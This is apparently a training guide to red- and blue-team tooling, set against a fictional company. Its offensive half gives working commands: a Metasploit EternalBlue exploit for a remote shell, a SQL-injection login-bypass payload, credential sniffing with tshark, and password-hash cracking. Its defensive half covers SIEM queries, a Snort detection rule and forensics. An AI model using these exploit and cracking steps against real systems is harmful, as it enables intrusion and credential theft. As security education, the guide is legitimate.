# Red and Blue Team Skills: A Practical Guide

This document provides a comprehensive overview of essential skills for both Red and Blue teams in cybersecurity. It includes practical, terminal-based use cases to help you understand how these skills are applied in real-world scenarios. For further learning, we reference the Not The Hidden Wiki (NTHW) repository.

## Hypothetical Scenario: Attack on ExampleCorp

To illustrate these skills, we'll use a consistent scenario:

*   **The Target:** ExampleCorp, a fictional company with the IP range `192.168.1.0/24`.
*   **The Attacker (Red Team):** A simulated adversary trying to breach ExampleCorp's network, gain unauthorized access, and exfiltrate sensitive data.
*   **The Defender (Blue Team):** The security team at ExampleCorp, responsible for monitoring the network, detecting threats, and responding to incidents.

---

## Red Team: Offensive Security

Red teams simulate attacks to identify and exploit vulnerabilities, helping organizations improve their security posture.

### Core Red Team Skills

*   **Penetration Testing:** Finding and exploiting vulnerabilities in networks, web applications, and mobile apps.
    *   *NTHW Reference:* `Red Team/Web Hacking`, `Red Team/Mobile`
*   **Social Engineering:** Manipulating individuals to gain access (e.g., phishing, vishing).
*   **Malware Analysis & Reverse Engineering:** Understanding how malware works to bypass defenses.
    *   *NTHW Reference:* `Red Team/Malware`, `Blue Team/Reverse Engineering`
*   **Evasion Techniques:** Bypassing firewalls, Intrusion Detection Systems (IDS), and antivirus.
*   **Open-Source Intelligence (OSINT):** Gathering public information to plan attacks.
    *   *NTHW Reference:* `Red Team/OSINT`
*   **Scripting & Programming:** Automating tasks and creating custom tools (e.g., Python, PowerShell).
*   **Active Directory Exploitation:** Targeting and compromising Active Directory environments.
    *   *NTHW Reference:* `Red Team/Active Directory`

### Red Team Tools: Practical Examples

#### 1. Nmap (Network Mapper)

**Use Case:** The Red Team starts by mapping out ExampleCorp's network to find active hosts and open ports.

**Command:**
```bash
# Scan the entire 192.168.1.0/24 subnet for active hosts,
# attempt to identify the services running on open ports (-sV),
# and try to determine the operating system (-O).
nmap -sV -O 192.168.1.0/24
```

#### 2. Metasploit Framework

**Use Case:** Nmap reveals a Windows server at `192.168.1.100` that appears to be vulnerable to the MS17-010 (EternalBlue) exploit. The Red Team will use Metasploit to gain a foothold.

**Commands:**
```bash
# Launch the Metasploit console
msfconsole

# Search for and use the EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set the target host
set RHOSTS 192.168.1.100

# Run the exploit to gain a remote shell
exploit
```

#### 3. Burp Suite (Web Application Testing)

**Use Case:** The Red Team discovers a web application on `192.168.1.50`. They will use Burp Suite to intercept and manipulate login requests to test for SQL injection.

**Action:**
1.  Launch Burp Suite from the terminal: `burpsuite`
2.  Configure your web browser to use Burp Suite's proxy (typically `127.0.0.1:8080`).
3.  Attempt to log in to the web application.
4.  In Burp Suite's "Proxy" > "Intercept" tab, modify the HTTP request parameters with SQL injection payloads (e.g., `'''' OR 1=1 --`).

#### 4. Wireshark (Network Protocol Analyzer)

**Use Case:** After gaining access, the Red Team wants to find credentials being sent in cleartext over the network.

**Commands:**
```bash
# Capture packets on the eth0 interface and save to a file
tshark -i eth0 -w capture.pcap

# Filter the captured packets to find HTTP POST requests
# that might contain login credentials.
tshark -r capture.pcap -Y "http.request.method == POST"
```

#### 5. John the Ripper (Password Cracker)

**Use Case:** The Red Team has dumped password hashes from a compromised database. Now they need to crack them.

**Command:**
```bash
# Assume hashes are in a file named 'hashes.txt'.
# John the Ripper will automatically detect the hash type
# and use its default wordlists to crack them.
john hashes.txt
```

---

## Blue Team: Defensive Security

Blue teams are responsible for defending an organization's assets from cyber threats through proactive monitoring and incident response.

### Core Blue Team Skills

*   **Incident Response:** A structured approach to managing security incidents.
    *   *NTHW Reference:* `Blue Team/Incident Response`
*   **Digital Forensics:** Collecting and analyzing digital evidence.
    *   *NTHW Reference:* `Blue Team/Forensics`
*   **Threat Hunting:** Proactively searching for hidden threats in the network.
    *   *NTHW Reference:* `Blue Team/Threat Hunting`
*   **SIEM (Security Information and Event Management):** Using tools like Splunk or ELK Stack to analyze security data.
*   **Vulnerability Management:** Identifying and mitigating system vulnerabilities.
    *   *NTHW Reference:* `Blue Team/Vulnerability Management`
*   **Network Security Monitoring:** Monitoring network traffic for suspicious activity.
*   **Log Analysis:** Analyzing logs to detect Indicators of Compromise (IOCs).

### Blue Team Tools: Practical Examples

#### 1. Splunk (SIEM)

**Use Case:** The Blue Team uses Splunk to monitor for brute-force login attempts against their systems.

**Splunk Search Query (SPL):**
```spl
# Search for failed login events (event ID 4625 on Windows)
# and count the number of failures per user from each source IP.
# Alert if any user has more than 10 failed logins in 5 minutes.
sourcetype="WinEventLog:Security" EventCode=4625
| stats count by user, src_ip
| where count > 10
```

#### 2. Snort (Intrusion Detection System)

**Use Case:** The Blue Team wants to detect and log any attempts to exploit the EternalBlue vulnerability that the Red Team is using.

**Snort Rule:**
```
# This rule alerts if it sees traffic matching the MS17-010 vulnerability.
alert tcp any any -> $HOME_NET 445 (msg:"ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Request"; flow:to_server,established; content:"|00 00 00 31 ff 53 4d 42 72 00 00 00 00 18 07 c8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff fe 00 00 00 00 00 6d 00 02 50 43 20 4e 45 54 57 4f 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 00|"; reference:cve,2017-0143; classtype:attempted-admin; sid:2024218; rev:2;)
```
**Command:**
```bash
# Run Snort in IDS mode, using the specified configuration file
# and listening on the eth0 interface.
snort -c /etc/snort/snort.conf -i eth0
```

#### 3. Zeek (Network Security Monitor)

**Use Case:** The Blue Team wants to monitor for unusual outbound connections that could indicate a compromised host communicating with a Command and Control (C2) server.

**Command:**
```bash
# Run Zeek on the eth0 interface.
# Zeek will automatically generate detailed logs (e.g., conn.log, http.log)
# in its default logging directory (e.g., /opt/zeek/logs/current/).
zeek -i eth0
```
**Analysis:** The Blue Team would then analyze `conn.log` for connections to unusual ports or IP addresses with a long duration.

#### 4. Volatility (Memory Forensics)

**Use Case:** A host is behaving suspiciously, but antivirus scans find nothing. The Blue Team takes a memory dump of the machine (`memory.dmp`) and uses Volatility to look for hidden processes.

**Command:**
```bash
# Analyze the memory dump to list all running processes at the
# time the dump was taken. This can reveal malware that is
# hiding from the operating system's process list.
vol.py -f memory.dmp pslist
```

#### 5. Wireshark (Network Protocol Analyzer)

**Use Case:** The Blue Team receives an alert about potential data exfiltration. They use Wireshark to inspect traffic from the suspected internal host (`192.168.1.100`).

**Command:**
```bash
# Capture traffic from a specific host and look for large DNS queries,
# which can be a sign of data exfiltration over DNS.
tshark -i eth0 -f "src host 192.168.1.100 and udp port 53" -T fields -e dns.qry.name
```

---

## Conclusion

Effective cybersecurity relies on a deep understanding of both offensive and defensive tactics. By simulating attacks, Red Teams reveal the very vulnerabilities that Blue Teams must learn to defend. This continuous cycle of attack and defense is what drives security forward. Mastering the tools and skills outlined in this guide is a critical step toward becoming a proficient cybersecurity professional.